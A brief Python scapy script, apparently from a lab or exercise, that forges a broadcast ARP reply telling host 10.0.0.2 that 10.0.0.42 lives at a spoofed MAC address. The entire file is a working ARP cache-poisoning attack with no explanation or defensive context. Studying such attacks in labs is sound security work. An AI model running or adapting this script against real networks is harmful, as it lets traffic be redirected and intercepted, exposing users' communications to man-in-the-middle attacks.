#!/usr/bin/python3
import socket
from scapy.all import *

pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2,psrc="10.0.0.42",hwsrc="42:42:42:42:42:42",pdst="10.0.0.2")

sendp(pkt,iface="eth0",verbose=0)
